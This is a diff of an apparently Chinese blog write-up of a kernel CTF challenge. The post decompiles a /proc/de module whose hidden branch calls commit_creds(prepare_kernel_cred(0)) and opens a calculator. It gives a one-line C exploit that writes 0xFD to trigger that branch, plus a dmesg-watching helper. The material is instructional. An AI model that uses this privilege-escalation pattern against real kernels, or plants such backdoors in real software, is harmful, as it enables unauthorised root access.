class="hljs-comment">;</span><br>  v6 = <span class="hljs-built_in">a3</span><span class="hljs-comment">;</span><br>  v8 = v7<span class="hljs-comment">;</span><br>  v20 = __readgsqword(<span class="hljs-number">0x28</span>u)<span class="hljs-comment">;</span><br>  mutex_lock(&amp;lock)<span class="hljs-comment">;</span><br>  v9 = (unsigned __int8)*<span class="hljs-built_in">a3</span><span class="hljs-comment">;</span><br>  printk(<span class="hljs-string">"order:%d"</span>, v9)<span class="hljs-comment">;</span><br>  v10 = *v6<span class="hljs-comment">;</span><br>  if ( *v6 )<br>  &#123;<br>    if ( v10 == -<span class="hljs-number">1</span> )<br>    &#123;<br>      printk(<span class="hljs-string">"note write\n"</span>, v9)<span class="hljs-comment">;</span><br>      v17 = *((_QWORD *)&amp;note + <span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>      _check_object_size(*((_QWORD *)&amp;note + <span class="hljs-number">1</span>), v8 - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL)<span class="hljs-comment">;</span><br>      copy_from_user(v17, v6 + <span class="hljs-number">1</span>, v8 - <span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>      printk(<span class="hljs-string">"write contents compelete\n"</span>, v6 + <span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>    &#125;<br>    else if ( v10 == -<span class="hljs-number">2</span> )<br>    &#123;<br>      printk(<span class="hljs-string">"note write magic %ld\n"</span>, v8)<span class="hljs-comment">;</span><br>      v16 = hack<span class="hljs-comment">;</span><br>      _check_object_size(hack, v8 - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL)<span class="hljs-comment">;</span><br>      copy_from_user(v16, v6 + <span class="hljs-number">1</span>, v8 - <span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>    &#125;<br>    else if ( v10 != -<span class="hljs-number">3</span> <span class="hljs-title">||</span> *(_BYTE *)(hack + <span class="hljs-number">8</span>) )<br>    &#123;<br>      printk(<span class="hljs-string">"note malloc\n"</span>, v9)<span class="hljs-comment">;</span><br>      note = *v6<span class="hljs-comment">;</span><br>      printk(<span class="hljs-string">"write size compelete\n"</span>, v9)<span class="hljs-comment">;</span><br>      v11 = _kmalloc((unsigned __int8)note, <span class="hljs-number">20971712</span>LL)<span class="hljs-comment">;</span><br>      v12 = (unsigned __int8)note<span class="hljs-comment">;</span><br>      *((_QWORD *)&amp;note + <span class="hljs-number">1</span>) = v11<span class="hljs-comment">;</span><br>      printk(<span class="hljs-string">"malloc size compelete:%d @ %p\n"</span>, v12)<span class="hljs-comment">;</span><br>    &#125;<br>    else<br>    &#123;<br>      v14 = prepare_kernel_cred(<span class="hljs-number">0</span>LL)<span class="hljs-comment">;</span><br>      commit_creds(v14)<span class="hljs-comment">;</span><br>      v18 = <span class="hljs-string">"/usr/bin/gnome-calculator"</span><span class="hljs-comment">;</span><br>      v19 = <span class="hljs-number">0</span>LL<span class="hljs-comment">;</span><br>      v15 = call_usermodehelper(<span class="hljs-string">"/usr/bin/gnome-calculator"</span>, &amp;v18, envp_26376, <span class="hljs-number">1</span>LL)<span class="hljs-comment">;</span><br>      printk(<span class="hljs-string">"RC is: %i \n"</span>, v15)<span class="hljs-comment">;</span><br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    printk(<span class="hljs-string">"note free\n"</span>, v9)<span class="hljs-comment">;</span><br>    kfree(*((_QWORD *)&amp;note + <span class="hljs-number">1</span>))<span class="hljs-comment">;</span><br>  &#125;<br>  mutex_unlock(&amp;lock)<span class="hljs-comment">;</span><br>  return v8<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="de-read"><a href="#de-read" class="headerlink" title="de_read"></a>de_read</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs undefined">unsigned <span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> de_read(<span class="hljs-variable">__int64</span> a1, <span class="hljs-variable">__int64</span> a2)<br>&#123;<br>  unsigned <span class="hljs-variable">__int64</span> v2; <span class="hljs-comment">// rdx</span><br>  unsigned <span class="hljs-variable">__int64</span> v3; <span class="hljs-comment">// r12</span><br>  unsigned <span class="hljs-variable">__int64</span> v4; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-variable">__int64</span> v5; <span class="hljs-comment">// r12</span><br><br>  <span class="hljs-variable">_fentry__</span>();<br>  v3 = v2;<br>  mutex_lock(&amp;<span class="hljs-built_in">lock</span>);<br>  printk(<span class="hljs-string">"/proc/de read\n"</span>, a2);<br>  v4 = (unsigned <span class="hljs-variable">__int8</span>)note;<br>  <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-variable">__int8</span>)note &gt; v3 )<br>    v4 = v3;<br>  v5 = *((<span class="hljs-variable">_QWORD</span> *)&amp;note + <span class="hljs-number">1</span>);<br>  <span class="hljs-variable">_check_object_size</span>(*((<span class="hljs-variable">_QWORD</span> *)&amp;note + <span class="hljs-number">1</span>), v4, <span class="hljs-number">1</span>LL);<br>  copy_to_user(a2, v5, v4);<br>  mutex_unlock(&amp;<span class="hljs-built_in">lock</span>);<br>  return v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我们可以看到我们只需要紧盯de_write函数即可,我们只需要让程序跳转到这里就可以调用后门来弹出计算器了<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs undefined">v14 = prepare_kernel_cred(0LL);<br>commit_creds(v14);<br>v18 = <span class="hljs-string">"/usr/bin/gnome-calculator"</span>;<br>v19 = 0LL;<br>v15 = call_usermodehelper(<span class="hljs-string">"/usr/bin/gnome-calculator"</span>, &amp;v18, envp_26376, 1LL);<br>printk(<span class="hljs-string">"RC is: %i \n"</span>, v15);<br></code></pre></td></tr></table></figure></p>
+<p>我们知道在内核中想要获得root权限不能只是用system(“/bin/sh”);而是用下面的语句：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">commit_creds(<span class="hljs-name">prepare_kernel_cred</span> (<span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></p>
 <p>这个函数分配并应用了一个新的凭证结构（uid = 0, gid = 0）从而获取root权限来执行命令</p>
-<p>那么我们该如何跳转到这里呢?<br>我们可以看到de_write的定义如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_int64 __usercall de_write@&lt;rax&gt;(__int64 a1@&lt;rbx&gt;, __int64 a2@&lt;rbp&gt;, char *a3@&lt;rsi&gt;, __int64 a4@&lt;r12&gt;, __int64 a5@&lt;r13&gt;, __int64 a6@&lt;r14&gt;)</span><br></pre></td></tr></table></figure></p>
-<p>而正常情况下write函数的定义为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(int filedes, void *buf, size_t nbytes);</span><br></pre></td></tr></table></figure></p>
-<p>因此我们不难猜到a3应该就是我们所传入的buf<br>而我们所关注的只有v6,也就是a3<br>后面做了一个赋值操作,即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v10 = *v6;</span><br></pre></td></tr></table></figure></p>
-<p>首先传入所写值v6,如果v6有值就进行下面的判断,首先如果v10==-1,那么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printk(&quot;note write\n&quot;, v9);</span><br><span class="line">v17 = *((_QWORD *)&amp;note + 1);</span><br><span class="line">_check_object_size(*((_QWORD *)&amp;note + 1), v8 - 1, 0LL);</span><br><span class="line">copy_from_user(v17, v6 + 1, v8 - 1);</span><br><span class="line">printk(&quot;write contents compelete\n&quot;, v6 + 1);</span><br></pre></td></tr></table></figure></p>
-<p>而如果是-2,那么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printk(&quot;note write magic %ld\n&quot;, v8);</span><br><span class="line">v16 = hack;</span><br><span class="line">_check_object_size(hack, v8 - 1, 0LL);</span><br><span class="line">copy_from_user(v16, v6 + 1, v8 - 1);</span><br></pre></td></tr></table></figure></p>
-<p>如果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v10 != -3 || *(_BYTE *)(hack + 8)</span><br></pre></td></tr></table></figure></p>
-<p>就运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printk(&quot;note malloc\n&quot;, v9);</span><br><span class="line">note = *v6;</span><br><span class="line">printk(&quot;write size compelete\n&quot;, v9);</span><br><span class="line">v11 = _kmalloc((unsigned __int8)note, 20971712LL);</span><br><span class="line">v12 = (unsigned __int8)note;</span><br><span class="line">*((_QWORD *)&amp;note + 1) = v11;</span><br><span class="line">printk(&quot;malloc size compelete:%d @ %p\n&quot;, v12);</span><br></pre></td></tr></table></figure></p>
-<p>否则才能跳转到我们所需要的逻辑上,而这个hack变量在bss段上,因此我们需要让v10=-1并且<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(hack+8)==0</span><br></pre></td></tr></table></figure></p>
+<p>那么我们该如何跳转到这里呢?<br>我们可以看到de_write的定义如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">_int64 __usercall de_write@<span class="hljs-tag">&lt;<span class="hljs-name">rax</span>&gt;</span>(__int64 a1@<span class="hljs-tag">&lt;<span class="hljs-name">rbx</span>&gt;</span>, __int64 a2@<span class="hljs-tag">&lt;<span class="hljs-name">rbp</span>&gt;</span>, char *a3@<span class="hljs-tag">&lt;<span class="hljs-name">rsi</span>&gt;</span>, __int64 a4@<span class="hljs-tag">&lt;<span class="hljs-name">r12</span>&gt;</span>, __int64 a5@<span class="hljs-tag">&lt;<span class="hljs-name">r13</span>&gt;</span>, __int64 a6@<span class="hljs-tag">&lt;<span class="hljs-name">r14</span>&gt;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>而正常情况下write函数的定义为:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-keyword">ssize_t</span> write(<span class="hljs-keyword">int</span> filedes, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbytes);<br></code></pre></td></tr></table></figure></p>
+<p>因此我们不难猜到a3应该就是我们所传入的buf<br>而我们所关注的只有v6,也就是a3<br>后面做了一个赋值操作,即<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-attribute">v10</span> = *v6<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></p>
+<p>首先传入所写值v6,如果v6有值就进行下面的判断,首先如果v10==-1,那么<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined">printk(<span class="hljs-string">"note write<span class="hljs-subst">\n</span>"</span>, v9);<br>v17 = *((_QWORD *)&amp;note + <span class="hljs-number">1</span>);<br>_check_object_size(*((_QWORD *)&amp;note + <span class="hljs-number">1</span>), v8 - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL);<br>copy_from_user(v17, v6 + <span class="hljs-number">1</span>, v8 - <span class="hljs-number">1</span>);<br>printk(<span class="hljs-string">"write contents compelete<span class="hljs-subst">\n</span>"</span>, v6 + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure></p>
+<p>而如果是-2,那么<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs undefined">printk(<span class="hljs-string">"note write magic %ld\n"</span>, v8)<span class="hljs-comment">;</span><br>v16 = hack<span class="hljs-comment">;</span><br>_check_object_size(<span class="hljs-name">hack</span>, v8 - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL)<span class="hljs-comment">;</span><br>copy_from_user(<span class="hljs-name">v16</span>, v6 + <span class="hljs-number">1</span>, v8 - <span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></p>
+<p>如果<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">v<span class="hljs-number">10</span> != <span class="hljs-number">-3</span> || *<span class="hljs-comment">(_BYTE *)</span><span class="hljs-comment">(hack + 8)</span><br></code></pre></td></tr></table></figure></p>
+<p>就运行<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs undefined">printk(<span class="hljs-string">"note malloc\n"</span>, v9);<span class="hljs-built_in"><br>note </span>= *v6;<br>printk(<span class="hljs-string">"write size compelete\n"</span>, v9);<br>v11 = _kmalloc((unsigned __int8)note, 20971712LL);<br>v12 = (unsigned __int8)note;<br>*((_QWORD *)&amp;note + 1) = v11;<br>printk(<span class="hljs-string">"malloc size compelete:%d @ %p\n"</span>, v12);<br></code></pre></td></tr></table></figure></p>
+<p>否则才能跳转到我们所需要的逻辑上,而这个hack变量在bss段上,因此我们需要让v10=-1并且<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">*<span class="hljs-comment">(_BYTE *)</span><span class="hljs-comment">(hack+8)</span>==<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></p>
 <p>迷惑行为2333</p>
 <p>其实这里我们直接看汇编部分会更加清楚</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">text:0000000000000020                 call    __fentry__</span><br><span class="line">.text:0000000000000025                 push    rbp</span><br><span class="line">.text:0000000000000026                 mov     rdi, offset lock</span><br><span class="line">.text:000000000000002D                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000030                 push    r14</span><br><span class="line">.text:0000000000000032                 push    r13</span><br><span class="line">.text:0000000000000034                 push    r12</span><br><span class="line">.text:0000000000000036                 push    rbx</span><br><span class="line">.text:0000000000000037                 mov     rbx, rsi</span><br><span class="line">.text:000000000000003A                 mov     r12, rdx</span><br><span class="line">.text:000000000000003D                 sub     rsp, 18h</span><br><span class="line">.text:0000000000000041                 mov     rax, gs:28h</span><br><span class="line">.text:000000000000004A                 mov     [rbp-28h], rax</span><br><span class="line">.text:000000000000004E                 xor     eax, eax</span><br><span class="line">.text:0000000000000050                 call    mutex_lock</span><br><span class="line">.text:0000000000000055                 movzx   esi, byte ptr [rbx]</span><br><span class="line">.text:0000000000000058                 mov     rdi, offset aOrderD ; &quot;order:%d&quot;</span><br><span class="line">.text:000000000000005F                 call    printk</span><br><span class="line">.text:0000000000000064                 movzx   eax, byte ptr [rbx]</span><br><span class="line">.text:0000000000000067                 test    al, al</span><br><span class="line">.text:0000000000000069                 jz      loc_1D6</span><br><span class="line">.text:000000000000006F                 cmp     al, 0FFh</span><br><span class="line">.text:0000000000000071                 jz      loc_191</span><br><span class="line">.text:0000000000000077                 cmp     al, 0FEh</span><br><span class="line">.text:0000000000000079                 jz      loc_155</span><br><span class="line">.text:000000000000007F                 cmp     al, 0FDh</span><br><span class="line">.text:0000000000000081                 jnz     short loc_90</span><br><span class="line">.text:0000000000000083                 mov     rax, cs:hack</span><br><span class="line">.text:000000000000008A                 cmp     byte ptr [rax+8], 0</span><br><span class="line">.text:000000000000008E                 jz      short loc_10E</span><br><span class="line">.text:0000000000000090</span><br></pre></td></tr></table></figure>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-symbol">text:</span><span class="hljs-number">0000000000000020</span>                 <span class="hljs-keyword">call</span>    __fentry__<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000025</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000026</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, offset <span class="hljs-keyword">lock</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000002D</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000030</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000032</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000034</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000036</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000037</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>000000000000003A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000003D</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000041</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">gs</span>:<span class="hljs-number">28h</span><br><span class="hljs-symbol">.text:</span>000000000000004A                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">28h</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>000000000000004E                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000050</span>                 <span class="hljs-keyword">call</span>    mutex_lock<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000055</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000058</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, offset aOrderD <span class="hljs-comment">; "order:%d"</span><br><span class="hljs-symbol">.text:</span>000000000000005F                 <span class="hljs-keyword">call</span>    printk<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000064</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000067</span>                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000069</span>                 <span class="hljs-keyword">jz</span>      loc_1D6<br><span class="hljs-symbol">.text:</span>000000000000006F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FFh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000071</span>                 <span class="hljs-keyword">jz</span>      loc_191<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000077</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FEh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000079</span>                 <span class="hljs-keyword">jz</span>      loc_155<br><span class="hljs-symbol">.text:</span>000000000000007F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FDh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000081</span>                 <span class="hljs-keyword">jnz</span>     short loc_90<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000083</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:hack<br><span class="hljs-symbol">.text:</span>000000000000008A                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">8</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000000008E                 <span class="hljs-keyword">jz</span>      short loc_10E<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000090</span><br></code></pre></td></tr></table></figure>
 <p>只需要调用write函数写入\xfd即可(我可真是个菜鸡</p>
 <p>exp如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line">   int fd = open(&quot;/proc/de&quot;, 2);</span><br><span class="line">   write(fd, &quot;\xfd&quot;, 1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">void</span> main()&#123;<br>   <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/proc/de"</span>, <span class="hljs-number">2</span>);<br>   <span class="hljs-built_in">write</span>(fd, <span class="hljs-string">"\xfd"</span>, <span class="hljs-number">1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
 <p>编译运行即可弹出计算器</p>
 <p>这里记录一个脚本可以实时查看内核的输出:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int compareFile(FILE *old, FILE *new);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *new;</span><br><span class="line">    FILE *old;</span><br><span class="line">    int lRet;</span><br><span class="line">    static first = 0;</span><br><span class="line">    </span><br><span class="line">    system(&quot;touch file_new&quot;);</span><br><span class="line">    system(&quot;touch file_old&quot;);</span><br><span class="line"></span><br><span class="line">    new = fopen(&quot;file_new&quot;, &quot;rw&quot;);</span><br><span class="line">    old = fopen(&quot;file_old&quot;, &quot;rw&quot;);</span><br><span class="line"></span><br><span class="line">    while(1)</span><br><span class="line">    &#123;   </span><br><span class="line">        sleep(1);</span><br><span class="line">        system(&quot;dmesg &gt; file_new&quot;);</span><br><span class="line">    </span><br><span class="line">        if (first == 0)</span><br><span class="line">        &#123;   </span><br><span class="line">            system(&quot;cp file_new file_old&quot;);</span><br><span class="line">            first++;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;   </span><br><span class="line"></span><br><span class="line">        new = fopen(&quot;file_new&quot;, &quot;rw&quot;);</span><br><span class="line">        old = fopen(&quot;file_old&quot;, &quot;rw&quot;);</span><br><span class="line">    </span><br><span class="line">        if (compareFile(new, old) == 0)</span><br><span class="line">        &#123;   </span><br><span class="line">            fclose(new);</span><br><span class="line">            fclose(old);</span><br><span class="line">            continue;</span><br><span class="line">        &#125;   </span><br><span class="line">        else</span><br><span class="line">        &#123;   </span><br><span class="line">            fclose(new);</span><br><span class="line">            fclose(old);</span><br><span class="line">    </span><br><span class="line">            system(&quot;diff file_new file_old&quot;);</span><br><span class="line">            system(&quot;cp file_new file_old&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int compareFile(FILE *old, FILE *new)</span><br><span class="line">&#123;</span><br><span class="line">    char c1;</span><br><span class="line">    char c2;</span><br><span class="line"></span><br><span class="line">    while(!feof(old) &amp;&amp; !feof(new))</span><br><span class="line">    &#123;</span><br><span class="line">        c1 = fgetc(old);</span><br><span class="line">        c2 = fgetc(new);</span><br><span class="line"></span><br><span class="line">        if (c1 != c2)</span><br><span class="line">        &#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ((c1 == EOF)&amp;&amp;(c2 == EOF))</span><br><span class="line">    &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
